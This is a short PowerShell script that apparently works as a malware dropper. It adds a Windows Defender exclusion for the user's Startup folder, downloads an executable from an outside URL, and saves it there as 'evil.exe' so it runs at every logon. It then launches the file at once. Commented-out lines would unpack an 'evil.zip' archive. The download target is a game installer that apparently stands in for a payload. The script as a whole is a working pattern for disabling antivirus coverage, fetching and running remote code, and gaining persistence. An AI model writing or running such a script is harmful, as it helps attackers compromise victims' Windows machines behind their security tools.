Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://ia902705.us.archive.org/10/items/WolfensteinEnemyTerritory_201404/Wolfenstein%20Enemy%20Territory.exe"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
#$zipPath = "$env:USERPROFILE\Documents\evil.zip"
#$extractPath = "$env:USERPROFILE\Documents\evil"
#Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
Start-Process -FilePath $exePath

